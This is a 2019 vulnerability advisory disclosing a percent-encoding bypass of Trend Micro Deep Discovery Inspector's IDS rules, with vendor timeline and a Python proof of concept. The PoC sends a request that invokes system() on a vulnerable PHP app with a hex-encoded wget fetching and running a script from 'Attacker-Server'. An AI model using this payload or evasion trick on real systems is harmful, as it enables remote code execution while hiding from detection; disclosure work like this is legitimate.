@@ -1,0 +1,104 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/TREND-MICRO-DEEP-DISCOVERY-INSPECTOR-PERCENT-ENCODING-IDS-BYPASS.txt
+[+] ISR: Apparition Security         
+ 
+
+[Vendor]
+www.trendmicro.com
+
+
+[Product]
+Deep Discovery Inspector
+
+Deep Discovery Inspector is a network appliance that monitors all ports and over 105 different network protocols to discover advanced threats and targeted attacks
+moving in and out of the network and laterally across it. The appliance detects and analyzes malware, command-and-control (C&C) communications, and evasive attacker
+activities that are invisible to standard security defenses.
+
+
+
+[Vulnerability Type]
+Percent Encoding IDS Bypass
+
+
+[CVE Reference]
+Vendor decided not to release a CVE
+
+
+[Security Issue]
+Trend Micro Deep Discovery Inspector IDS will typically trigger alerts for malicious system commands like "Wget Commandline Injection" and they will be flagged as high.
+Attacker payloads sent with normal ascii characters for example like "wget" or even if they have been HEX encoded like "\x77\x67\x65\x74" they will still get flagged and alerted on.
+
+However, attackers can easily bypass these alerts by sending malicious commands in HEX preceded by percent sign chars "%", e.g. "%77%67%65%74" which also translates to "wget" and
+will not get flagged or alerted on and may still be processed on the target system.
+
+e.g.
+
+DDI RULE 2452 
+https://www.trendmicro.com/vinfo/us/threat-encyclopedia/network/ddi-rule-2452
+
+Therefore, Trend Micro IDS alerts can be easily bypassed and the payload is still run by the vulnerable target if the payload is encoded using percent/hex encoding like %77%67%65%74.
+That will not only bypass the IDE by having no alert triggered or notification sent but the application will still process the malicious command.
+
+Importantly, the "wget" DDI Rule 2452 used is just an example and can potentially be any malicious request where the IDS checks the character encodings but fails to account for
+percent encoded HEX character payload values. 
+
+
+[Exploit/POC]
+from socket import *
+#Bypass TM DDI IDS e.g. Rule 2452 (Wget command line injection) PoC
+#Discovery: hyp3rlinx - ApparitionSec
+#Apparition Security
+#Firewall Rule Bypass
+
+IP = raw_input("[+] Trend Micro IDS")
+PORT = 80
+
+payload="/index.php?s=/index/vulnerable/app/invoke&function=call_user_func_array&vars[0]=system&vars[1][]=%77%67%65%74%20http://Attacker-Server/x.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a"
+req = "GET "+payload+" HTTP/1.1\r\nHost"+IP+"\r\nConnection: close\r\n\r\n"
+
+s=socket(AF_INET, SOCK_STREAM)
+s.connect((IP, PORT))
+s.send(req)
+res=""
+
+while True:
+    res = s.recv(512)
+    print res
+    if res=="\n" or "</html>":
+        break
+
+s.close()
+
+
+#Result is 200 HTTP OK and code execution on vuln app and No IDS Alert gets triggered.
+
+
+
+[Network Access]
+Remote
+
+
+
+[Severity]
+High
+
+
+
+[Disclosure Timeline]
+Vendor Notification: May 14, 2019
+Vendor confirmed the IDS Bypass: May 20, 2019
+Vendor informed that a DDI IDS enhancement has been made: July 18, 2019
+July 23, 2019 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
